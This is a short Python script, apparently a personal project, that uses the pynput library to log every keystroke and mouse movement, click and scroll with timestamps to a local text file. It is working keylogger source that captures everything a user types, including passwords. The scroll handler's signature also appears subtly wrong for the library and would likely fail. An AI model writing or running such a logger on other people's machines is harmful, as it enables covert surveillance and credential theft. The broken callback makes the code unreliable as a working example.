from pynput import keyboard, mouse
from datetime import datetime

file = r"E:\coding\python\Projects\Log File.txt"

def write(event_type, details):
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(file, "a") as f:
        f.write(f"{time} - [{event_type}] {details}\n")

def onPress(key):
    try:
        write("", key.char)
    except AttributeError:
        write("", str(key))

def on_move(x, y):
    write("MouseMove", f"Position: {x, y}")

def on_click(x, y, button, pressed):
    action = "Pressed" if pressed else "Released"
    write("MouseClick", f"{button} {action} at {x, y}")

def on_scroll(x, y, dy):
    write("MouseScroll", f"Scrolled {'down' if dy < 0 else 'up'} at {x, y}")

keyboard_listener = keyboard.Listener(on_press=onPress)
mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll)

keyboard_listener.start()
mouse_listener.start()

keyboard_listener.join()
mouse_listener.join()
